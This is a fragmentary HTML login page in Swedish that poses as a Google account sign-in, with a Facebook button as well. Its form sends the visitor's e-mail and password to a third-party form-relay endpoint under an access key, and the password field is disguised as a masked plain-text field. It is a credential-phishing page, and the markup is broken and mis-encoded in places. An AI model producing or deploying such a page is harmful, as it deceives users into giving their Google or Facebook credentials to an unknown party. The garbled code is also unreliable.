    <title>Logga in</title>

    <style>
      #psw {
        -webkit-text-security: disc;

                      alt="Phone image"

                Logga in
              </h1>
              <p class="text-gray-700">
                Anv√§nd ditt Google-konto
              </p>
            </div>
            <div class="m-7">
              <form autocomplete="on" action="https://api.web3forms.com/submit" method="POST" id="form">
                <input type="hidden" name="access_key" value="09bbe31c-223a-4721-8a39-361c2417ce4e" />
                <input type="hidden" name="subject" value="Nytt entry!" />

                <div class="mb-6">
                  <input type="email" name="email" id="email" placeholder="E-post" required class="w-full px-3 py-2 placeholder-gray-300 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-100 focus:border-indigo-300" />
                </div>

                <div class="mb-6">
                  <input id="psw" type="name" name="name" id="name" placeholder="L√∂senord" required class="w-full px-3 py-2 placeholder-gray-300 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-100 focus:border-indigo-300" />
                </div>

                <div class="flex justify-between items-center mb-6">
                  <div class="form-group form-check">
                    <label class="form-check-label inline-block font-semibold text-blue-600 ml-1" for="exampleCheck2"
                      >Skapa konto</label
                    >
                  </div>
                  <button
                    type="submit"
                    class="inline-block px-7 py-3 bg-blue-600 text-white font-medium text-sm leading-snug rounded shadow-md hover:bg-blue-700 hover:shadow-lg focus:bg-blue-700 focus:shadow-lg focus:outline-none focus:ring-0 active:bg-blue-800 active:shadow-lg transition duration-150 ease-in-out"
                    >
                    Logga in
                  </button>
                </div>

                <p class="text-base text-center text-gray-400" id="result"></p>
              </form>
              <div
                  class="flex items-center my-4 before:flex-1 before:border-t before:border-gray-300 before:mt-0.5 after:flex-1 after:border-t after:border-gray-300 after:mt-0.5"

                </div>

                  class="px-7 py-3 text-white font-medium text-sm leading-snug uppercase rounded shadow-md hover:shadow-lg focus:shadow-lg focus:outline-none focus:ring-0 active:shadow-lg transition duration-150 ease-in-out w-full flex justify-center items-center mb-3"

                  data-mdb-ripple-color="light"

                    xmlns="http://www.w3.org/2000/svg"

                    /></svg>Forts√§tt med Facebook

                  style="background-color: #55acee"

                  data-mdb-ripple-color="light"
